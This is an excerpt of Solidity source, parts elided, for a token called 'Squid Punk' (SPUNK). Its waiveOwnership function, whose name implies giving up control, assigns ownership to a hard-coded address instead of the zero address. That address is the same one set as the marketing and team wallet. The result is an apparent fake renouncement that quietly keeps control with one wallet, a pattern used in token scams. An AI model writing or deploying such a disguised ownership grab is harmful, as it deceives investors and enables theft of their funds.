...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x313B368c8C55afc9e5920613057B9a96048D9E70);
    }
...
contract SquidPunk is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Squid Punk";
    string private _symbol = "SPUNK";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x313B368c8C55afc9e5920613057B9a96048D9E70);
    address payable private teamWalletAddress = payable(0x313B368c8C55afc9e5920613057B9a96048D9E70);
